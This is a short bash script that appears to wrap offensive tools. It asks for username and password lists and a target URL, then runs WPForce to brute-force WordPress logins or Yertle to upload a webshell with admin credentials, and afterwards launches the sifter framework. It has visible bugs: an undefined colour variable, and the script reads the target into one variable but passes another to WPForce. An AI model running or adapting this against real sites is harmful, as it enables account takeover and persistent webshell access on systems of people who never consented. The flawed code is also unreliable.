#!/usr/bin/env bash
ORNG='\033[0;33m'
NC='\033[0m'
W='\033[1;37m'
LP='\033[1;35m'
YLW='\033[1;33m'
LBBLUE='\e[104m'

cd /opt/WPForce
wpforce(){
	echo -e "${RED}"
	figlet -f mini WPForce
	echo -e "${NC}"
	echo -e "${W}Please enter the full path/to/users.txt file for brutforcing${NC}"
	read USERS
	echo -e "${W}Please enter the full /path/to/passlist.txt file for brutforcing${NC}"
	read PASSL
	echo -e "${W}Please enter the target URL with webmask(http:// - https://)${NC}"
	read TARGET 
	sudo python wpforce.py -i ${USERS} -w ${PASSL} -u "${URL}" -v -t 8
}
yertle(){
	echo -e "${RED}"
	figlet -f mini Yertle
	echo -e "${NC}"
	echo -e "${W}Please enter the username to use for webshell upload(preferably admin)${NC}"
	read USER
	echo -e "${W}Please enter the password to use for webshell upload"
	read PASS
	echo -e "${W}Please enter the target URL"
	read TARGET
	sudo python yertle.py -u "${USER}" -p "${PASS}" -t "${TARGET}" -i
}

echo -e "${W}Would you like to use ${RED}(W)PForce ${W}for brutforcing or ${RED}(Y)ertle ${W}for webshell upload${NC}"
read ANS
if [[ ${ANS} == "w" ]] || [[ ${ANS} == "W" ]]; then
	wpforce
else
	yertle
fi
cd /opt/sifter
./sifter -m
